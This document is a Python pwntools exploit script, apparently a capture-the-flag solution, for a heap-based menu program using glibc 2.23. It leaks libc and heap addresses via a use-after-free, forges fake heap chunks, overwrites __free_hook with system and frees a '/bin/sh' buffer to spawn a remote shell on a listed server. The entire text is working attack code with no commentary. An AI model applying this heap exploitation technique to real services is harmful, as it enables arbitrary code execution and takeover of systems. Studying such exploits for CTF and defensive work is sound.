from pwn import*
context.log_level ='DEBUG'
def name(data1,data2):
	p.sendlineafter('choice:','0')
	p.sendafter('name?',data1)
	p.sendafter('desc?',data2)
def new(size):
	p.sendlineafter('choice:','1')
	p.sendlineafter('message?',str(size))
def free(index):
	p.sendlineafter('choice:','2')
	p.sendlineafter('deleted?',str(index))
def edit(index,content):
	p.sendlineafter('choice:','3')
	p.sendlineafter('modified?',str(index))
	p.sendafter('message?',content)
def show(index):
	p.sendlineafter('choice:','4')
	p.sendlineafter('showed?',str(index))
p = process('./main')
p = remote('49.235.243.206',10504)
libc =ELF('./libc-2.23.so')
new(0x80)
new(0x200)
new(0x100)
free(0)
show(0)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 0x10 - 88 -libc.sym['__malloc_hook']
new(0x80)
p.recvuntil('Ptr: ')
heap_base = int(('0x' + p.recvuntil('\n',drop=True)),16) - 0x10
log.info('LIBC:\t' + hex(libc_base))
log.info('HEAP:\t' + hex(heap_base))
free(1)
new(0x300)
victim = heap_base + 0x90
fake_chunk2 = 0x602100
fake_chunk1 = 0x602120
name(p64(0) + p64(0x211) + p64(fake_chunk1),p64(0) + p64(0x211) + p64(victim) + p64(fake_chunk2))
edit(1,p64(0) + p64(fake_chunk1))
new(0x200)
new(0x200)
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
edit(6,'\x00'*0x10 + p64(free_hook))
edit(0,p64(system))
edit(1,'/bin/sh\x00')
free(1)
p.interactive()
